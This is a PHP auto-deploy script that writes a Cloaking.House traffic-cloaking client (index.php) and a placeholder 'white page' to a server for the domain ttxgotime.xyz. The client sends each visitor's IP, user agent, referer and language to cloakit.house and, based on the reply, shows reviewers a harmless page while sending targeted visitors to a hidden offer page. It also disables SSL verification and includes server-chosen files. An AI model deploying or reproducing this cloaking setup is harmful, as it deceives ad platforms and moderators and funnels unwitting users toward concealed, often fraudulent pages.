<?php
// Web-based deployment script for ttxgotime.xyz
// Upload this file to your VPS and run it via browser

echo "<h1>🚀 ttxgotime.xyz Auto-Deploy</h1>";
echo "<p>Deploying all files to VPS...</p>";

// Files to create
$files = [
    'index.php' => '<?php

    // Не рекомендуется вносить самостоятельно изменения в скрипт, так как любые последствия неработоспособности будут лежать на вас.
    // С уважением, Cloaking.House

    // It is not recommended to make changes to this script on your own, as any consequences of malfunction will be your responsibility.
    // Sincerely, Cloaking.House

    error_reporting(0);
    
    if (function_exists(\'mb_internal_encoding\')) {
        mb_internal_encoding(\'UTF-8\');
    }

    if (version_compare(PHP_VERSION, \'7.2\', \'<\')) {
        exit(\'PHP 7.2 or higher is required.\');
    }

    if ( ! extension_loaded(\'curl\')) {
        exit(\'The cURL PHP extension is required.\');
    }

    if ( ! extension_loaded(\'mbstring\')) {
        exit(\'The mbstring PHP extension is required.\');
    }

    if ( ! extension_loaded(\'openssl\')) {
        exit(\'The OpenSSL PHP extension is required.\');
    }

    if ( ! extension_loaded(\'json\')) {
        exit(\'The JSON PHP extension is required.\');
    }

    if (!extension_loaded(\'filter\')) {
        exit(\'The Filter PHP extension is required.\');
    }

    if ( ! ini_get(\'allow_url_fopen\')) {
        exit(\'The "allow_url_fopen" setting must be enabled in php.ini.\');
    }

    function get_real_ip_address()
    {
        $ip_address = isset($_SERVER[\'REMOTE_ADDR\']) ? $_SERVER[\'REMOTE_ADDR\'] : \'0.0.0.0\';
        $ip_headers = [
            \'HTTP_CLIENT_IP\',
            \'HTTP_X_FORWARDED_FOR\',
            \'HTTP_X_FORWARDED\',
            \'HTTP_X_CLUSTER_CLIENT_IP\',
            \'HTTP_FORWARDED_FOR\',
            \'HTTP_FORWARDED\',
            \'HTTP_CF_CONNECTING_IP\',
            \'HTTP_TRUE_CLIENT_IP\',
            \'HTTP_X_COMING_FROM\',
            \'HTTP_COMING_FROM\',
            \'HTTP_FORWARDED_FOR_IP\',
            \'HTTP_X_REAL_IP\'
        ];

        foreach ($ip_headers AS $header) {
            if ( ! empty($_SERVER[$header])) {
                $ips = explode(\',\', $_SERVER[$header]);
                foreach ($ips AS $ip) {
                    $ip = trim($ip);
                    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                        return $ip;
                    }
                }
            }
        }

        return $ip_address;
    }

    function create_stream_context()
    {
        return stream_context_create([
            \'ssl\' => [
                \'verify_peer\' => FALSE, 
                \'verify_peer_name\' => FALSE
            ], 
            \'http\' => [
                \'header\' => \'User-Agent: \' . get_user_agent()
            ]
        ]);
    }

    function get_user_agent()
    {
        return ! empty($_SERVER[\'HTTP_USER_AGENT\']) ? $_SERVER[\'HTTP_USER_AGENT\'] : \'\';
    }

    function get_referer()
    {
        return ! empty($_SERVER[\'HTTP_REFERER\']) ? $_SERVER[\'HTTP_REFERER\'] : \'\';
    }

    function get_query_string()
    {
        return ! empty($_SERVER[\'QUERY_STRING\']) ? $_SERVER[\'QUERY_STRING\'] : \'\';
    }

    function get_browser_language()
    {
        return ! empty($_SERVER[\'HTTP_ACCEPT_LANGUAGE\']) ? $_SERVER[\'HTTP_ACCEPT_LANGUAGE\'] : \'\';
    }

    $request_data = [
        \'label\'         => \'83709f9a58f525c7998bc28e5cdd63b3\', 
        \'user_agent\'    => get_user_agent(), 
        \'referer\'       => get_referer(), 
        \'query\'         => get_query_string(), 
        \'lang\'          => get_browser_language(),
        \'ip_address\'    => get_real_ip_address()
    ];
        
    $request_data   = http_build_query($request_data);
    $success_codes  = [200, 201, 204, 206];

    $ch = curl_init(\'https://cloakit.house/api/v1/check\');
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER  => TRUE,
        CURLOPT_CUSTOMREQUEST   => \'POST\',
        CURLOPT_SSL_VERIFYPEER  => FALSE,
        CURLOPT_TIMEOUT         => 15,
        CURLOPT_POSTFIELDS      => $request_data
    ]);

    $result = curl_exec($ch);
    $info   = curl_getinfo($ch);
    curl_close($ch);

    if (isset($info[\'http_code\']) && in_array($info[\'http_code\'], $success_codes)) {
        $body = json_decode($result, TRUE);

        if ( ! empty($body[\'filter_type\'])) {
            $messages = [
                \'subscription_expired\'  => \'Your Subscription Expired.\',
                \'flow_deleted\'          => \'Flow Deleted.\',
                \'flow_banned\'           => \'Flow Banned.\',
            ];
        
            if (isset($messages[$body[\'filter_type\']])) {
                exit($messages[$body[\'filter_type\']]);
            }
        }
        
        if ( ! empty($body[\'url_white_page\']) && ! empty($body[\'url_offer_page\'])) {
            if ($body[\'filter_page\'] == \'offer\') {
                if ($body[\'mode_offer_page\'] == \'loading\') {
                    if (filter_var($body[\'url_offer_page\'], FILTER_VALIDATE_URL)) {
                        echo str_replace(\'<head>\', \'<head><base href="\' . $body[\'url_offer_page\'] . \'" />\', file_get_contents($body[\'url_offer_page\'], FALSE, create_stream_context()));
                    } elseif (file_exists($body[\'url_offer_page\'])) {
                        if (pathinfo($body[\'url_offer_page\'], PATHINFO_EXTENSION) == \'html\') {
                            echo file_get_contents($body[\'url_offer_page\'], FALSE, create_stream_context());
                        } else {
                            require_once($body[\'url_offer_page\']);
                        }
                    } else {
                        exit(\'Offer Page Not Found.\');
                    }
                }

                if ($body[\'mode_offer_page\'] == \'redirect\') {
                    header(\'Location: \' . $body[\'url_offer_page\'], TRUE, 302);
                    exit(0);
                }

                if ($body[\'mode_offer_page\'] == \'iframe\') {
                    echo \'<iframe src="\' . $body[\'url_offer_page\'] . \'" width="100%" height="100%" align="left"></iframe><style> body { padding: 0; margin: 0; } iframe { margin: 0; padding: 0; border: 0; }</style>\';
                    exit(0);
                }
            }

            if ($body[\'filter_page\'] == \'white\') {
                if ($body[\'mode_white_page\'] == \'loading\') {
                    if (filter_var($body[\'url_white_page\'], FILTER_VALIDATE_URL)) {
                        echo str_replace(\'<head>\', \'<head><base href="\' . $body[\'url_white_page\'] . \'" />\', file_get_contents($body[\'url_white_page\'], FALSE, create_stream_context()));
                    } elseif (file_exists($body[\'url_white_page\'])) {
                        if (pathinfo($body[\'url_white_page\'], PATHINFO_EXTENSION) == \'html\') {
                            echo file_get_contents($body[\'url_white_page\'], FALSE, create_stream_context());
                        } else {
                            require_once($body[\'url_white_page\']);
                        }
                    } else {
                        exit(\'White Page Not Found.\');
                    }
                }

                if ($body[\'mode_white_page\'] == \'redirect\') {
                    header(\'Location: \' . $body[\'url_white_page\'], TRUE, 302);
                    exit(0);
                }
            }
        } else {
            exit(\'Offer Page or White Page Not Found.\');
        }
    } else {
        exit(\'Try again later or contact support.\');
    }

?>',
    
    'site.html' => '<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>White Page - Test Landing</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, \'Segoe UI\', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; color: white; }
        .container { text-align: center; max-width: 600px; padding: 2rem; background: rgba(255, 255, 255, 0.1); border-radius: 20px; backdrop-filter: blur(10px); box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1); }
        h1 { font-size: 3rem; margin-bottom: 1rem; font-weight: 300; }
        p { font-size: 1.2rem; margin-bottom: 2rem; opacity: 0.9; line-height: 1.6; }
        .status { background: rgba(255, 255, 255, 0.2); padding: 1rem; border-radius: 10px; margin-top: 2rem; }
        .emoji { font-size: 4rem; margin-bottom: 1rem; }
        @media (max-width: 768px) { .container { margin: 1rem; padding: 1.5rem; } h1 { font-size: 2rem; } p { font-size: 1rem; } }
    </style>
</head>
<body>
    <div class="container">
        <div class="emoji">🛡️</div>
        <h1>White Page</h1>
        <p>This is a test white page for cloaking script validation. If you\'re seeing this page, the cloaking system is working correctly and showing the white page to non-targeted traffic.</p>
        <div class="status">
            <strong>Status:</strong> White page active<br>
            <strong>Time:</strong> <span id="currentTime"></span>
        </div>
    </div>
    <script>
        function updateTime() { const now = new Date(); document.getElementById(\'currentTime\').textContent = now.toLocaleString(); }
        updateTime(); setInterval(updateTime, 1000);
    </script>
</body>
</html>'
];

// Create files
$success = 0;
$total = count($files);

foreach ($files as $filename => $content) {
    if (file_put_contents($filename, $content)) {
        echo "<p>✅ Created: $filename</p>";
        $success++;
    } else {
        echo "<p>❌ Failed: $filename</p>";
    }
}

echo "<h2>Deployment Summary</h2>";
echo "<p>Successfully created: $success/$total files</p>";

if ($success == $total) {
    echo "<h3>🎉 DEPLOYMENT COMPLETE!</h3>";
    echo "<p>All files have been deployed successfully.</p>";
    echo "<p><strong>Test URLs:</strong></p>";
    echo "<ul>";
    echo "<li><a href='index.php'>index.php (Cloaking Script)</a></li>";
    echo "<li><a href='site.html'>site.html (White Page)</a></li>";
    echo "</ul>";
} else {
    echo "<h3>⚠️ Partial Deployment</h3>";
    echo "<p>Some files failed to deploy. Please check permissions.</p>";
}

echo "<p><strong>Next Steps:</strong></p>";
echo "<ol>";
echo "<li>Configure DNS to point ttxgotime.xyz to this server</li>";
echo "<li>Set up Cloaking.House flow</li>";
echo "<li>Test the setup</li>";
echo "</ol>";

// Clean up this deployment script
echo "<p><a href='?cleanup=1'>🗑️ Clean up deployment script</a></p>";

if (isset($_GET['cleanup'])) {
    unlink(__FILE__);
    echo "<p>✅ Deployment script removed</p>";
}
?>
